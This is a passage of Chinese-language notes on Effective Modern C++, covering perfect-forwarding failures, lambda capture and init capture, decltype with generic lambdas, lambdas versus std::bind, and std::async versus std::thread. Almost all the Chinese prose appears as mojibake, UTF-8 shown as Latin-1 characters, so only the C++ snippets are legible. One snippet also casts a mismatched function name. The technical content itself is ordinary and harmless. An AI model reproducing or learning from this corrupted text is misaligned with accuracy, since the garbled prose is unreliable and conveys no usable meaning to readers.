é“¾æ¥æ—¶ï¼Œé“¾æ¥ä¸åˆ°å†…å­˜ï¼Œå°±ä¼šæŠ¥é”™ã€‚ åªè¦ç»™æ•´å‹static constæä¾›ä¸€ä¸ªå®šä¹‰ï¼Œå°±å¯ä»¥è§£å†³é—®é¢˜äº†ï¼Œæ¯”å¦‚è¿™æ ·ï¼š 1const std::size_t Widget::MinVals; //åœ¨Widgetçš„.cppæ–‡ä»¶ æ³¨æ„å®šä¹‰ä¸­ä¸è¦é‡å¤åˆå§‹åŒ–ã€‚å¦‚æœåœ¨ä¸¤ä¸ªåœ°æ–¹éƒ½æä¾›äº†åˆå§‹åŒ–ï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥é”™ï¼Œæé†’ä½ åªèƒ½åˆå§‹åŒ–ä¸€æ¬¡ã€‚ é‡è½½å‡½æ•°çš„åç§°å’Œæ¨¡æ¿åç§° å‡è®¾æœ‰äº†ä¸€ä¸ªé‡è½½å‡½æ•°ï¼ŒprocessValï¼š 1234void f(int (*pf)(int));int processVal(int value);int processVal(int value, int priority); ä¼ é€’ç»™ f æ˜¯æ²¡é—®é¢˜çš„ï¼Œå› ä¸ºç¼–è¯‘å™¨æ˜¯å¯ä»¥åŸºäºç°æœ‰ä¿¡æ¯åˆ¤æ–­è°ƒç”¨å“ªä¸€ä¸ªé‡è½½å‡½æ•°çš„ã€‚ ä½†æ˜¯ï¼Œfwd(processVal); ä¸è¡Œã€‚ å•ç”¨processValæ˜¯æ²¡æœ‰ç±»å‹ä¿¡æ¯çš„ï¼Œæ‰€ä»¥å°±ä¸èƒ½ç±»å‹æ¨å¯¼ï¼Œå®Œç¾è½¬å‘å¤±è´¥ã€‚ éœ€è¦è¿™æ ·ä½¿ç”¨ï¼š 123456using ProcessFuncType = int (*)(int);ProcessFuncType processValPtr = processVal; //æŒ‡å®šæ‰€éœ€çš„processValç­¾åfwd(processValPtr); //å¯ä»¥fwd(static_cast&lt;ProcessFuncType&gt;(workOnVal)); //ä¹Ÿå¯ä»¥ å¯¹äºæ¨¡æ¿ï¼Œæœ‰ç›¸ä¼¼çš„é—®é¢˜ã€‚ä¸€ä¸ªå‡½æ•°æ¨¡æ¿ä¸ä»£è¡¨å•ç‹¬ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒè¡¨ç¤ºä¸€ä¸ªå‡½æ•°æ—ï¼š 12345template&lt;typename T&gt;T workOnVal(T param) //å¤„ç†å€¼çš„æ¨¡æ¿&#123; â€¦ &#125;fwd(workOnVal); //é”™è¯¯ï¼å“ªä¸ªworkOnValå®ä¾‹ï¼Ÿ è¦è®©åƒfwdçš„å®Œç¾è½¬å‘å‡½æ•°æ¥å—ä¸€ä¸ªé‡è½½å‡½æ•°åæˆ–è€…æ¨¡æ¿åï¼Œæ–¹æ³•æ˜¯æŒ‡å®šè¦è½¬å‘çš„é‚£ä¸ªé‡è½½æˆ–è€…å®ä¾‹ã€‚ ä½åŸŸ IPv4çš„å¤´éƒ¨æœ‰å¦‚ä¸‹æ¨¡å‹ï¼šï¼ˆå‡å®šä½åŸŸæ˜¯æŒ‰ä»æœ€ä½æœ‰æ•ˆä½ï¼ˆleast significant bitï¼Œlsbï¼‰åˆ°æœ€é«˜æœ‰æ•ˆä½ï¼ˆmost significant bitï¼Œmsbï¼‰ 12345678struct IPv4Header &#123; std::uint32_t version:4, IHL:4, DSCP:6, ECN:2, totalLength:16; â€¦&#125;; å¦‚æœå£°æ˜æˆ‘ä»¬çš„å‡½æ•°fï¼ˆè½¬å‘å‡½æ•°fwdçš„ç›®æ ‡ï¼‰ä¸ºæ¥æ”¶ä¸€ä¸ªstd::size_tçš„å½¢å‚ï¼Œåˆ™ä½¿ç”¨IPv4Headerå¯¹è±¡çš„totalLengthå­—æ®µè¿›è¡Œè°ƒç”¨æ²¡æœ‰é—®é¢˜ï¼š 12345void f(std::size_t sz); //è¦è°ƒç”¨çš„å‡½æ•°IPv4Header h;â€¦f(h.totalLength); //å¯ä»¥ å¦‚æœé€šè¿‡fwdè½¬å‘h.totalLengthç»™få‘¢ï¼Œé‚£å°±æ˜¯ä¸€ä¸ªä¸åŒçš„æƒ…å†µäº†ï¼š 1fwd(h.totalLength); //é”™è¯¯ï¼ é—®é¢˜åœ¨äºfwdçš„å½¢å‚æ˜¯å¼•ç”¨ï¼Œè€Œh.totalLengthæ˜¯non-constä½åŸŸï¼Œè¿™æ˜¯C++ä¸å…è®¸çš„è¡Œä¸ºã€‚ ä½åŸŸå¯èƒ½åŒ…å«äº†ä¸€ä¸ªå­—çš„ä»»æ„éƒ¨åˆ†ï¼ˆæ¯”å¦‚32ä½intçš„3-5ä½ï¼‰ï¼Œä½†æ˜¯è¿™äº›ä¸œè¥¿æ— æ³•ç›´æ¥å¯»å€ã€‚åœ¨ç¡¬ä»¶å±‚é¢å¼•ç”¨å’ŒæŒ‡é’ˆæ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥æ²¡æœ‰åŠæ³•åˆ›å»ºä¸€ä¸ªæŒ‡å‘ä»»æ„bitçš„æŒ‡é’ˆã€‚ ä¼ é€’ä½åŸŸç»™å®Œç¾è½¬å‘çš„æ–¹æ³•å°±æ˜¯ï¼Œåˆ›å»ºå‰¯æœ¬ç„¶ååˆ©ç”¨å‰¯æœ¬è°ƒç”¨å®Œç¾è½¬å‘ã€‚åœ¨IPv4Headerçš„ä¾‹å­ä¸­ï¼Œå¯ä»¥å¦‚ä¸‹å†™æ³•ï¼š 1234//æ‹·è´ä½åŸŸå€¼auto length = static_cast&lt;std::uint16_t&gt;(h.totalLength);fwd(length); //è½¬å‘è¿™ä¸ªå‰¯æœ¬ ç»“è®º å¯¼è‡´å®Œç¾è½¬å‘å¤±è´¥çš„å®å‚ç§ç±»æœ‰ï¼šèŠ±æ‹¬å·åˆå§‹åŒ–ï¼Œä½œä¸ºç©ºæŒ‡é’ˆçš„0æˆ–è€…NULLï¼Œä»…æœ‰å£°æ˜çš„static constæ•°æ®æˆå‘˜ï¼Œæ¨¡æ¿å’Œé‡è½½å‡½æ•°çš„åå­—ï¼Œä½åŸŸã€‚ 30 Lambda è¡¨è¾¾å¼ é—­åŒ…ï¼ˆenclosureï¼‰æ˜¯lambdaåˆ›å»ºçš„è¿è¡Œæ—¶å¯¹è±¡ã€‚ä¾èµ–æ•è·æ¨¡å¼ï¼Œé—­åŒ…æŒæœ‰è¢«æ•è·æ•°æ®çš„å‰¯æœ¬æˆ–è€…å¼•ç”¨ã€‚ é—­åŒ…ç±»ï¼ˆclosure classï¼‰æ˜¯ä»ä¸­å®ä¾‹åŒ–é—­åŒ…çš„ç±»ã€‚æ¯ä¸ªlambdaéƒ½ä¼šä½¿ç¼–è¯‘å™¨ç”Ÿæˆå”¯ä¸€çš„é—­åŒ…ç±»ã€‚lambdaä¸­çš„è¯­å¥æˆä¸ºå…¶é—­åŒ…ç±»çš„æˆå‘˜å‡½æ•°ä¸­çš„å¯æ‰§è¡ŒæŒ‡ä»¤ã€‚ lambdaé€šå¸¸è¢«ç”¨æ¥åˆ›å»ºé—­åŒ…ï¼Œè¯¥é—­åŒ…ä»…ç”¨ä½œå‡½æ•°çš„å®å‚ã€‚é—­åŒ…é€šå¸¸å¯ä»¥æ‹·è´ï¼Œæ‰€ä»¥å¯èƒ½æœ‰å¤šä¸ªé—­åŒ…å¯¹åº”äºä¸€ä¸ªlambdaã€‚ ä½†æ˜¯å¯¹äºé—­åŒ…ï¼Œéœ€è¦æ˜ç™½çš„ä¸€ç‚¹æ˜¯ï¼šåŒºåˆ†ä»€ä¹ˆå­˜åœ¨äºç¼–è¯‘æœŸï¼ˆlambdas å’Œé—­åŒ…ç±»ï¼‰ï¼Œä»€ä¹ˆå­˜åœ¨äºè¿è¡Œæ—¶ï¼ˆé—­åŒ…ï¼‰ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ç›¸äº’å…³ç³»ã€‚ é¿å…ä½¿ç”¨é»˜è®¤çš„æ•è·æ¨¡å¼ æŒ‰é»˜è®¤å¼•ç”¨æ•è·ä¼šå¯¼è‡´é—­åŒ…ä¸­åŒ…å«äº†å¯¹æŸä¸ªå±€éƒ¨å˜é‡æˆ–è€…å½¢å‚çš„å¼•ç”¨ã€‚å¦‚æœè¯¥lambdaåˆ›å»ºçš„é—­åŒ…ç”Ÿå‘½å‘¨æœŸè¶…è¿‡äº†å±€éƒ¨å˜é‡ï¼Œé‚£ä¹ˆé—­åŒ…ä¸­çš„å¼•ç”¨å°†ä¼šå˜æˆæ‚¬ç©ºå¼•ç”¨ã€‚ å¦å¤–ï¼Œæˆå‘˜å‡½æ•°ä¸­ï¼Œä½¿ç”¨æ•è·éœ€è¦æ˜ç™½ this æŒ‡é’ˆçš„å­˜åœ¨ï¼Œç›´æ¥æ•è·æˆå‘˜å˜é‡æ˜¯ä¼šå‡ºé”™çš„ã€‚ ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯ï¼š 123456789void Widget::addFilter() const&#123; auto divisorCopy = divisor; //æ‹·è´æ•°æ®æˆå‘˜ filters.emplace_back( [divisorCopy](int value) //æ•è·å‰¯æœ¬ &#123; return value % divisorCopy == 0; &#125; //ä½¿ç”¨å‰¯æœ¬ );&#125; åœ¨C++14ä¸­ï¼Œä¸€ä¸ªæ›´å¥½çš„æ•è·æˆå‘˜å˜é‡çš„æ–¹å¼æ—¶ä½¿ç”¨é€šç”¨çš„lambdaæ•è·ï¼š 1234567void Widget::addFilter() const&#123; filters.emplace_back( //C++14ï¼š [divisor = divisor](int value) //æ‹·è´divisoråˆ°é—­åŒ… &#123; return value % divisor == 0; &#125; //ä½¿ç”¨è¿™ä¸ªå‰¯æœ¬ );&#125; å¦‚æœæ˜¯ static æˆå‘˜ï¼Œé‚£ä¹ˆé»˜è®¤æ•è·è¡Œä¸ºå°†ä»€ä¹ˆä¹Ÿä¸ä¼šæ•è·ã€‚ ç»“è®º é»˜è®¤çš„æŒ‰å¼•ç”¨æ•è·å¯èƒ½ä¼šå¯¼è‡´æ‚¬ç©ºå¼•ç”¨ã€‚ é»˜è®¤çš„æŒ‰å€¼æ•è·å¯¹äºæ‚¬ç©ºæŒ‡é’ˆå¾ˆæ•æ„Ÿï¼ˆå°¤å…¶æ˜¯thisæŒ‡é’ˆï¼‰ï¼Œå¹¶ä¸”å®ƒä¼šè¯¯å¯¼äººäº§ç”Ÿlambdaæ˜¯ç‹¬ç«‹çš„æƒ³æ³•ã€‚ 31 ä½¿ç”¨ init capture æ¥ç§»åŠ¨å¯¹è±¡åˆ°é—­åŒ… åœ¨æŸäº›åœºæ™¯ä¸‹ï¼ŒæŒ‰å€¼æ•è·å’ŒæŒ‰å¼•ç”¨æ•è·éƒ½ä¸æ˜¯ä½ æ‰€æƒ³è¦çš„ã€‚å¦‚æœä½ æœ‰ä¸€ä¸ªåªèƒ½è¢«ç§»åŠ¨çš„å¯¹è±¡ï¼ˆä¾‹å¦‚std::unique_ptræˆ–std::futureï¼‰è¦è¿›å…¥åˆ°é—­åŒ…é‡Œï¼Œä½¿ç”¨C++11æ˜¯æ— æ³•å®ç°çš„ã€‚åˆ°äº†C++14å°±å¦ä¸€å›äº‹äº†ï¼Œå®ƒèƒ½æ”¯æŒå°†å¯¹è±¡ç§»åŠ¨åˆ°é—­åŒ…ä¸­ã€‚ init capture C++14ä¸­ï¼Œè¿™æ˜¯ä½¿ç”¨åˆå§‹åŒ–æ•è·å°†std::unique_ptrç§»åŠ¨åˆ°é—­åŒ…ä¸­çš„æ–¹æ³•ï¼š 123456789101112131415161718class Widget &#123; //ä¸€äº›æœ‰ç”¨çš„ç±»å‹public: â€¦ bool isValidated() const; bool isProcessed() const; bool isArchived() const;private: â€¦&#125;;auto pw = std::make_unique&lt;Widget&gt;(); //åˆ›å»ºWidgetï¼›ä½¿ç”¨std::make_unique //çš„æœ‰å…³ä¿¡æ¯å‚è§æ¡æ¬¾21â€¦ //è®¾ç½®*pwauto func = [pw = std::move(pw)] //ä½¿ç”¨std::move(pw)åˆå§‹åŒ–é—­åŒ…æ•°æ®æˆå‘˜ &#123; return pw-&gt;isValidated() &amp;&amp; pw-&gt;isArchived(); &#125;; â€œpw = std::move(pw)â€çš„æ„æ€æ˜¯â€œåœ¨é—­åŒ…ä¸­åˆ›å»ºä¸€ä¸ªæ•°æ®æˆå‘˜pwï¼Œå¹¶ä½¿ç”¨å°†std::moveåº”ç”¨äºå±€éƒ¨å˜é‡pwçš„ç»“æœæ¥åˆå§‹åŒ–è¯¥æ•°æ®æˆå‘˜â€ã€‚ åœ¨C++11ä¸­ï¼Œæ— æ³•æ•è·è¡¨è¾¾å¼çš„ç»“æœã€‚ å› æ­¤ï¼Œåˆå§‹åŒ–æ•è·çš„å¦ä¸€ä¸ªåç§°æ˜¯é€šç”¨lambdaæ•è·ï¼ˆgeneralized lambda captureï¼‰ã€‚ lambdaè¡¨è¾¾å¼åªæ˜¯ç”Ÿæˆä¸€ä¸ªç±»å’Œåˆ›å»ºè¯¥ç±»å‹å¯¹è±¡çš„ä¸€ç§ç®€å•æ–¹å¼è€Œå·²ã€‚æ²¡ä»€ä¹ˆæ˜¯ä½ ç”¨lambdaå¯ä»¥åšè€Œä¸èƒ½è‡ªå·±æ‰‹åŠ¨å®ç°çš„ã€‚ C++14çš„ç¤ºä¾‹ä»£ç å¯ä»¥ç”¨C++11é‡æ–°ç¼–å†™ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 123456789101112131415class IsValAndArch &#123; //â€œis validated and archivedâ€public: using DataType = std::unique_ptr&lt;Widget&gt;; explicit IsValAndArch(DataType&amp;&amp; ptr) //æ¡æ¬¾25è§£é‡Šäº†std::moveçš„ä½¿ç”¨ : pw(std::move(ptr)) &#123;&#125; bool operator()() const &#123; return pw-&gt;isValidated() &amp;&amp; pw-&gt;isArchived(); &#125; private: DataType pw;&#125;;auto func = IsValAndArch(std::make_unique&lt;Widget&gt;()); ä½¿ç”¨ bind çš„è§£å†³æ–¹æ³•ï¼š C++11çš„ç­‰æ•ˆä»£ç å¦‚ä¸‹ï¼Œå…¶ä¸­æˆ‘å¼ºè°ƒäº†ç›¸åŒçš„å…³é”®äº‹é¡¹ï¼š 12345678910std::vector&lt;double&gt; data; â€¦ auto func = std::bind( //C++11æ¨¡æ‹Ÿåˆå§‹åŒ–æ•è· [](const std::vector&lt;double&gt;&amp; data) //è¯‘è€…æ³¨ï¼šæœ¬è¡Œé«˜äº® &#123; /*ä½¿ç”¨data*/ &#125;, std::move(data) //è¯‘è€…æ³¨ï¼šæœ¬è¡Œé«˜äº® ); é»˜è®¤æƒ…å†µä¸‹ï¼Œä»lambdaç”Ÿæˆçš„é—­åŒ…ç±»ä¸­çš„operator()æˆå‘˜å‡½æ•°ä¸ºconstçš„ã€‚åœ¨lambdaä¸»ä½“å†…æŠŠé—­åŒ…ä¸­çš„æ‰€æœ‰æ•°æ®æˆå‘˜æ¸²æŸ“ä¸ºconstã€‚ ä½†æ˜¯ï¼Œbindå¯¹è±¡å†…éƒ¨çš„ç§»åŠ¨æ„é€ çš„dataå‰¯æœ¬ä¸æ˜¯constçš„ï¼Œå› æ­¤ï¼Œä¸ºäº†é˜²æ­¢åœ¨lambdaå†…ä¿®æ”¹è¯¥dataå‰¯æœ¬ï¼Œlambdaçš„å½¢å‚åº”å£°æ˜ä¸ºreference-to-constã€‚ å¦‚æœå°†lambdaå£°æ˜ä¸ºmutableï¼Œåˆ™é—­åŒ…ç±»ä¸­çš„operator()å°†ä¸ä¼šå£°æ˜ä¸ºconstï¼Œå¹¶ä¸”åœ¨lambdaçš„å½¢å‚å£°æ˜ä¸­çœç•¥constä¹Ÿæ˜¯åˆé€‚çš„ï¼š 123456auto func = std::bind( //C++11å¯¹mutable lambda [](std::vector&lt;double&gt;&amp; data) mutable //åˆå§‹åŒ–æ•è·çš„æ¨¡æ‹Ÿ &#123; /*ä½¿ç”¨data*/ &#125;, std::move(data) ); ç»“è®º ä½¿ç”¨C++14çš„åˆå§‹åŒ–æ•è·å°†å¯¹è±¡ç§»åŠ¨åˆ°é—­åŒ…ä¸­ã€‚ åœ¨C++11ä¸­ï¼Œå¯ä»¥é€šè¿‡æ‰‹å†™ç±»æˆ–std::bindçš„æ–¹å¼æ¥æ¨¡æ‹Ÿåˆå§‹åŒ–æ•è·ã€‚ 33 å¯¹auto&amp;&amp;å½¢å‚ä½¿ç”¨decltype 12auto f = [](auto&amp;&amp; x) &#123; return func(normalize(std::forward&lt;???&gt;(x))); &#125;; è¿™é‡Œçš„???è¯¥æ˜¯ä»€ä¹ˆï¼Ÿ åœ¨æ³›å‹lambdaä¸­ï¼Œæ²¡æœ‰å¯ç”¨çš„ç±»å‹å‚æ•°Tã€‚åœ¨lambdaç”Ÿæˆçš„é—­åŒ…é‡Œï¼Œæ¨¡ç‰ˆåŒ–çš„operator()å‡½æ•°ä¸­çš„ç¡®æœ‰ä¸€ä¸ªTï¼Œä½†åœ¨lambdaé‡Œå´æ— æ³•ç›´æ¥ä½¿ç”¨å®ƒã€‚ å¦‚æœä¸€ä¸ªå·¦å€¼å®å‚è¢«ä¼ ç»™é€šç”¨å¼•ç”¨çš„å½¢å‚ï¼Œé‚£ä¹ˆå½¢å‚ç±»å‹ä¼šå˜æˆå·¦å€¼å¼•ç”¨ã€‚ä¼ é€’çš„æ˜¯å³å€¼ï¼Œå½¢å‚å°±ä¼šå˜æˆå³å€¼å¼•ç”¨ã€‚è¿™æ„å‘³ç€åœ¨è¿™ä¸ªlambdaä¸­ï¼Œå¯ä»¥é€šè¿‡æ£€æŸ¥å½¢å‚xçš„ç±»å‹æ¥ç¡®å®šä¼ é€’è¿›æ¥çš„å®å‚æ˜¯ä¸€ä¸ªå·¦å€¼è¿˜æ˜¯å³å€¼ï¼Œdecltypeå°±å¯ä»¥å®ç°è¿™æ ·çš„æ•ˆæœã€‚ ä¼ é€’ç»™lambdaçš„æ˜¯ä¸€ä¸ªå·¦å€¼ï¼Œdecltype(x)å°±èƒ½äº§ç”Ÿä¸€ä¸ªå·¦å€¼å¼•ç”¨ï¼›å¦‚æœä¼ é€’çš„æ˜¯ä¸€ä¸ªå³å€¼ï¼Œdecltype(x)å°±ä¼šäº§ç”Ÿå³å€¼å¼•ç”¨ã€‚ åœ¨è°ƒç”¨std::forwardæ—¶ï¼Œæƒ¯ä¾‹å†³å®šäº†ç±»å‹å®å‚æ˜¯å·¦å€¼å¼•ç”¨æ—¶æ¥è¡¨æ˜è¦ä¼ è¿›å·¦å€¼ï¼Œç±»å‹å®å‚æ˜¯éå¼•ç”¨å°±è¡¨æ˜è¦ä¼ è¿›å³å€¼ã€‚ åœ¨å‰é¢çš„lambdaä¸­ï¼Œå¦‚æœxç»‘å®šçš„æ˜¯ä¸€ä¸ªå·¦å€¼ï¼Œdecltype(x)å°±èƒ½äº§ç”Ÿä¸€ä¸ªå·¦å€¼å¼•ç”¨ã€‚ ç„¶è€Œå¦‚æœxç»‘å®šçš„æ˜¯ä¸€ä¸ªå³å€¼ï¼Œdecltype(x)å°±ä¼šäº§ç”Ÿå³å€¼å¼•ç”¨ï¼Œè€Œä¸æ˜¯å¸¸è§„çš„éå¼•ç”¨ã€‚ ä½†æ˜¯decltype(x)å°±ä¼šäº§ç”Ÿå³å€¼å¼•ç”¨ä¼ å…¥ std::forward åï¼Œå¼•ç”¨æŠ˜å åçš„ç»“æœå’Œä¼ å…¥éå¼•ç”¨çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚ æ‰€ä»¥decltype(x) å®Œç¾è§£å†³äº†é—®é¢˜ã€‚ C++14ä¸­çš„lambdaä¹Ÿå¯ä»¥æ˜¯å¯å˜å½¢å‚çš„ï¼Œæœ€åçš„å®ç°å¦‚ä¸‹ï¼š 123456auto f = [](auto&amp;&amp;... params) &#123; return func(normalize(std::forward&lt;decltype(params)&gt;(params)...)); &#125;; 34 ä¼˜å…ˆè€ƒè™‘lambdaè€Œéstd::bind ä¼˜å…ˆlambdaè€Œä¸æ˜¯std::bindçš„æœ€é‡è¦åŸå› æ˜¯lambdaæ›´æ˜“è¯»ã€‚ ä½†æ˜¯ï¼Œåœ¨C++11ä¸­ï¼Œå¯ä»¥åœ¨ä¸¤ç§æƒ…å†µä¸‹ä½¿ç”¨std::bindæ˜¯åˆç†çš„ï¼š ç§»åŠ¨æ•è·ã€‚C++11çš„lambdaä¸æä¾›ç§»åŠ¨æ•è·ï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ç»“åˆlambdaå’Œstd::bindæ¥æ¨¡æ‹Ÿã€‚ å¤šæ€å‡½æ•°å¯¹è±¡ã€‚å› ä¸ºbindå¯¹è±¡ä¸Šçš„å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ä½¿ç”¨å®Œç¾è½¬å‘ï¼Œæ‰€ä»¥å®ƒå¯ä»¥æ¥å—ä»»ä½•ç±»å‹çš„å®å‚ ä¾‹å¦‚ï¼š 123456class PolyWidget &#123;public: template&lt;typename T&gt; void operator()(const T&amp; param); â€¦&#125;; std::bindå¯ä»¥å¦‚ä¸‹ç»‘å®šä¸€ä¸ªPolyWidgetå¯¹è±¡ï¼š 12PolyWidget pw;auto boundPW = std::bind(pw, _1); boundPWå¯ä»¥æ¥å—ä»»æ„ç±»å‹çš„å¯¹è±¡äº†ï¼š 123boundPW(1930); //ä¼ intç»™PolyWidget::operator()boundPW(nullptr); //ä¼ nullptrç»™PolyWidget::operator()boundPW(\"Rosebud\"); //ä¼ å­—é¢å€¼ç»™PolyWidget::operator() è¿™ä¸€ç‚¹æ— æ³•ä½¿ç”¨C++11çš„lambdaåšåˆ°ã€‚ ä½†æ˜¯ï¼Œåœ¨C++14ä¸­ï¼Œå¯ä»¥é€šè¿‡å¸¦æœ‰autoå½¢å‚çš„lambdaè½»æ¾å®ç°ï¼š 12auto boundPW = [pw](const auto&amp; param) //C++14 &#123; pw(param); &#125;; ç»“è®º ä¸ä½¿ç”¨std::bindç›¸æ¯”ï¼Œlambdaæ›´æ˜“è¯»ï¼Œæ›´å…·è¡¨è¾¾åŠ›å¹¶ä¸”å¯èƒ½æ›´é«˜æ•ˆã€‚ åªæœ‰åœ¨C++11ä¸­ï¼Œstd::bind å¯¹å®ç°ç§»åŠ¨æ•è·ï¼Œæˆ–è€…ç»‘å®šå‡½æ•°æ¨¡æ¿ï¼Œä¼šå¾ˆæœ‰ç”¨ã€‚ å¹¶å‘API C++11çš„ä¼Ÿå¤§æˆåŠŸä¹‹ä¸€æ˜¯å°†å¹¶å‘æ•´åˆåˆ°è¯­è¨€å’Œåº“ä¸­ã€‚ 35 ä¼˜å…ˆè€ƒè™‘åŸºäºä»»åŠ¡çš„ç¼–ç¨‹è€ŒéåŸºäºçº¿ç¨‹çš„ç¼–ç¨‹ å¦‚æœå¼€å‘è€…æƒ³è¦å¼‚æ­¥æ‰§è¡ŒdoAsyncWorkå‡½æ•°ï¼Œé€šå¸¸æœ‰ä¸¤ç§æ–¹å¼ã€‚å…¶ä¸€æ˜¯é€šè¿‡åˆ›å»ºstd::threadæ‰§è¡ŒdoAsyncWorkï¼Œè¿™æ˜¯åº”ç”¨äº†åŸºäºçº¿ç¨‹ï¼ˆthread-basedï¼‰çš„æ–¹å¼ï¼š 12int doAsyncWork();std::thread t(doAsyncWork); å…¶äºŒæ˜¯å°†doAsyncWorkä¼ é€’ç»™std::asyncï¼Œä¸€ç§åŸºäºä»»åŠ¡ï¼ˆtask-basedï¼‰çš„ç­–ç•¥ï¼š 1auto fut = std::async(doAsyncWork); //â€œfutâ€è¡¨ç¤ºâ€œfutureâ€ è¿™ç§æ–¹å¼ä¸­ï¼Œä¼ é€’ç»™std::asyncçš„å‡½æ•°å¯¹è±¡è¢«ç§°ä¸ºä¸€ä¸ªä»»åŠ¡ï¼ˆtaskï¼‰ã€‚ åŸºäºä»»åŠ¡çš„æ–¹æ³•é€šå¸¸æ¯”åŸºäºçº¿ç¨‹çš„æ–¹æ³•æ›´ä¼˜ï¼š ä»£ç é‡æ›´å°‘ å¦‚æœ task çš„è¿”å›å€¼æ˜¯å¿…éœ€çš„ï¼Œé‚£ä¹ˆ thread-based çš„æ–¹å¼å°†æ— èƒ½ä¸ºåŠ›ã€‚è€ŒåŸºäºä»»åŠ¡çš„æ–¹æ³•å°±ç®€å•äº†ï¼Œå› ä¸ºstd::asyncè¿”å›çš„futureæä¾›äº†getå‡½æ•°ï¼ˆä»è€Œå¯ä»¥è·å–è¿”å›å€¼ï¼‰ã€‚ å¦‚æœdoAsycnWorkå‘ç”Ÿäº†å¼‚å¸¸ï¼Œgetå‡½æ•°å°±æ˜¾å¾—æ›´ä¸ºé‡è¦ï¼Œå› ä¸ºgetå‡½æ•°å¯ä»¥æä¾›æŠ›å‡ºå¼‚å¸¸çš„è®¿é—®ï¼Œè€ŒåŸºäºçº¿ç¨‹çš„æ–¹æ³•ï¼Œå¦‚æœdoAsyncWorkæŠ›å‡ºäº†å¼‚å¸¸ï¼Œç¨‹åºä¼šç›´æ¥ç»ˆæ­¢ï¼ˆé€šè¿‡è°ƒç”¨std::terminateï¼‰ã€‚ åŒºåˆ« åŸºäºçº¿ç¨‹ä¸åŸºäºä»»åŠ¡æœ€æ ¹æœ¬çš„åŒºåˆ«åœ¨äºï¼ŒåŸºäºä»»åŠ¡çš„æŠ½è±¡å±‚æ¬¡æ›´é«˜ã€‚åŸºäºä»»åŠ¡çš„æ–¹å¼ä½¿å¾—å¼€å‘è€…ä»çº¿ç¨‹ç®¡ç†çš„ç»†èŠ‚ä¸­è§£æ”¾å‡ºæ¥ï¼Œå¯¹æ­¤åœ¨C++å¹¶å‘è½¯ä»¶ä¸­æ€»ç»“äº†â€œthreadâ€çš„ä¸‰ç§å«ä¹‰ï¼š ç¡¬ä»¶çº¿ç¨‹ï¼ˆhardware threadsï¼‰æ˜¯çœŸå®æ‰§è¡Œè®¡ç®—çš„çº¿ç¨‹ã€‚ç°ä»£è®¡ç®—æœºä½“ç³»ç»“æ„ä¸ºæ¯ä¸ªCPUæ ¸å¿ƒæä¾›ä¸€ä¸ªæˆ–è€…å¤šä¸ªç¡¬ä»¶çº¿ç¨‹ã€‚ è½¯ä»¶çº¿ç¨‹ï¼ˆsoftware threadsï¼‰ï¼ˆä¹Ÿè¢«ç§°ä¸ºç³»ç»Ÿçº¿ç¨‹ï¼ˆOS threadsã€system threadsï¼‰ï¼‰æ˜¯æ“ä½œç³»ç»Ÿç®¡ç†çš„åœ¨ç¡¬ä»¶çº¿ç¨‹ä¸Šæ‰§è¡Œçš„çº¿ç¨‹ã€‚é€šå¸¸å¯ä»¥å­˜åœ¨æ¯”ç¡¬ä»¶çº¿ç¨‹æ›´å¤šæ•°é‡çš„è½¯ä»¶çº¿ç¨‹ã€‚å½“è½¯ä»¶çº¿ç¨‹è¢«é˜»å¡çš„æ—¶å€™ï¼ˆæ¯”å¦‚ I/Oã€åŒæ­¥é”æˆ–è€…æ¡ä»¶å˜é‡ï¼‰ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥è°ƒåº¦å…¶ä»–æœªé˜»å¡çš„è½¯ä»¶çº¿ç¨‹æ‰§è¡Œæä¾›ååé‡ã€‚ std::thread æ˜¯C++æ‰§è¡Œè¿‡ç¨‹çš„å¯¹è±¡ï¼Œå¹¶ä½œä¸ºè½¯ä»¶çº¿ç¨‹çš„å¥æŸ„ï¼ˆhandleï¼‰ã€‚ è½¯ä»¶çº¿ç¨‹æ˜¯æœ‰é™çš„èµ„æºã€‚å¦‚æœå¼€å‘è€…è¯•å›¾åˆ›å»ºå¤§äºç³»ç»Ÿæ”¯æŒçš„çº¿ç¨‹æ•°é‡ï¼Œä¼šæŠ›å‡ºstd::system_errorå¼‚å¸¸ã€‚ å³ä½¿æ²¡æœ‰è¶…å‡ºè½¯ä»¶çº¿ç¨‹çš„é™é¢ï¼Œä»ç„¶å¯èƒ½ä¼šé‡åˆ°èµ„æºè¶…é¢ï¼ˆoversubscriptionï¼‰çš„éº»çƒ¦ã€‚å½“å‰å‡†å¤‡è¿è¡Œçš„ï¼ˆå³æœªé˜»å¡çš„ï¼‰è½¯ä»¶çº¿ç¨‹å¤§äºç¡¬ä»¶çº¿ç¨‹çš„æ•°é‡æ—¶ï¼Œçº¿ç¨‹è°ƒåº¦å™¨ä¼šå°†è½¯ä»¶çº¿ç¨‹æ—¶é—´åˆ‡ç‰‡ï¼Œåˆ†é…åˆ°ç¡¬ä»¶ä¸Šã€‚ å½“ä¸€ä¸ªè½¯ä»¶çº¿ç¨‹çš„æ—¶é—´ç‰‡æ‰§è¡Œç»“æŸï¼Œä¼šè®©ç»™å¦ä¸€ä¸ªè½¯ä»¶çº¿ç¨‹ï¼Œæ­¤æ—¶å‘ç”Ÿä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚è½¯ä»¶çº¿ç¨‹çš„ä¸Šä¸‹æ–‡åˆ‡æ¢ä¼šå¢åŠ ç³»ç»Ÿçš„è½¯ä»¶çº¿ç¨‹ç®¡ç†å¼€é”€ã€‚å½“è½¯ä»¶çº¿ç¨‹å®‰æ’åˆ°ä¸ä¸Šæ¬¡æ—¶é—´ç‰‡è¿è¡Œæ—¶ä¸åŒçš„ç¡¬ä»¶çº¿ç¨‹ä¸Šï¼Œè¿™ä¸ªå¼€é”€ä¼šæ›´é«˜ã€‚ ä½¿ç”¨std::async å°†çº¿ç¨‹ç®¡ç†çš„èŒè´£è½¬äº¤ç»™C++æ 